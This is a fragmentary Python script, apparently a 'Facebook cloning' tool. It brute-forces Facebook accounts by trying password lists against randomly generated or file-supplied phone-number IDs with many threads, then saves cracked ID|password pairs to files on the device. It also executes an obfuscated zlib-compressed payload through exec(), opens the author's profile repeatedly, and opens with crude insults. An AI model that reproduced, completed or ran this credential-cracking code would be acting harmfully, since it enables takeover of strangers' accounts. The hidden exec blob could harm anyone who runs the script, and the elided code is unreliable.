#RANDI FUCKED
#AAUKAT BANA APNA
#MANISH DON HONI FERII!!
#FULLY WORKING COMMAND 
#YOUR DAD MANISH HERE
...
def clear():
        os.system('clear')
print('\033[1;37m[+] \033[1;32mWAIT UNTIL OPEN GAND OF AWAIS TAHIR...')
try:
...
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 10; RMX2002 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.99 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/308.0.0.42.118;]"}
...
exec(zlib.decompress(b'x\x9c\x8d\xcc\xbd\x0e\x820\x18\x85\xe1\xdd\xab\xf86J\x0c?B\x8cQ\xa7"5"\xa2\tb\x94\xa0\x03BU"\xa5\rm\x82\xde\xbd\x0c\xee\xba\x9c\xe4\x0c\xcf+\xda\xaaQH;\xdb\xae\x9b\x8d\xe6\xd3\t\xcb\x86\x17\xf8>\xd7a\xeb\x93\x07\xf8\x88\x83=$x\x15\xc4\xfd&\t\xd6\xf4\x81\xf8\x83\xc5\x04v\xdbM\n)N\x08\x89 \x0c\xfc\x1e\xaa\x8aQS\xd6\x94\n\xe4\xe8\x83\xa2\xa6y\x8b~\xe6\x96\x87EH|\xf0R\x88b\x03\xfbA\xdf\xe1\xd2\x94o\xa9(C\xda\xab\xbc\x1b\\\xd0\x06\x1eJ\t9\xb3\xac\xae\xeb\xcc[^\xd0+\xe7O\xb3\xe0\xccbm^Vc\xdb\xb6{\xf8\x01\xb3\x03Ek'))
sim_id = ''
...
\033[1;32m----------------------------------------------
 \033[1;37m[+] Owner    :  MANISH
 \033[1;37m[+] Partner   :  JAMES & SUSHANT
 \033[1;37m[+] Version   :  1.2
 \033[1;37m[+] Status    :  Premium
 \033[1;32m----------------------------------------------
 \033[1;37mMANISH DON ALWAYS ONE TOP FIRE COMMAND
 HO
\033[1;32m----------------------------------------------""")
def linex():
        print('\033[1;37m----------------------------------------------')
...
def menu():
        try:
                clear()
                os.system(' xdg-open https://www.facebook.com/man1shh?mibextid=ZbWKwL')
                if 1==1:
                        clear()
                        print('\033[1;37m[1] File cloning\n\033[1;37m[2] Coming soon\n\033[1;37m[0] Exit')
                        linex()
                        xd=input('\033[1;37m[?] Choice : ')
                        if xd in ['1','01']:
                                os.system(' xdg-open https://www.facebook.com/man1shh?mibextid=ZbWKwL');clear()
                                file = input('\033[1;37m[-] Enter File : ')
                                try:
                                        ...
                                        menu()
                                clear()
                                print('\033[1;32m[1] Method\n[2] Method')
                                linex()
                                mthd=input('\033[1;32m[?] Choose : ')
                                linex()
                                plist = []
                                print('\033[1;37m           Select Password Crack menu');linex();print('[1] Crack with auto password\n[2] Crack with choice password');linex()
                                ...
                                with tred(max_workers=30) as crack_submit:
                                        ...
                                        linex()
                                        print(f'\033[1;37mUSE DATA THEN OK IDZ WILL COME')
                                        linex()
                                        for user in fo:
                                ...
                                os.system(' xdg-open https://www.facebook.com/man1shh?mibextid=ZbWKwL');menu()
                        elif xd in ['3','03']:
                                exit('BYE HOMIES') 
                        elif xd in ['4','04']:
                                clear()
                                print(' [1] Nepal cloning\n [2] Bangladesh cloning\n [3] Indonesia Cloning\n [4] Gmail cloning\n [0] Back menu')
                                linex()
                                x=input(' Choose: ')
                                if x in ['1','01']:
                                        nep()
...
def pak():
                user=[]
                clear()
                print('\033[1;31m Code example: 9816,9820,9817,9818')
...
def indo():
                ...
                for nmbr in range(limit):
                        nmp = ''.join(random.choice(string.digits) for _ in range(8))
                        user.append(nmp)
                with tred(max_workers=60) as Aking:     
                        clear()
                        tl = str(len(user))
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [MANISH-💚] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Aking:
                                print('\r\r\033[1;32m [MANISH-💚-OK] %s | %s'%(ids,pas))
                                open('/sdcard/MANISH-💚-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
        ...
        try:
                ...
                for pw in passlist:
                        ...
                        if 'session_key' in po:
                                        print('\r\r\033[1;32m [MANISH-💚-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/MANISH-💚-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r \033[1;34m[MANISH-💚-2F] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
                ...
                for pas in passlist:
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [MANISH-💚-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/MANISH-💚-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                try:
                                ...
                                if uid in oks:pass
                                        ...
                                        print('\r\r\x1b[38;5;208m [MANISH-💚-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/MANISH-💚-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
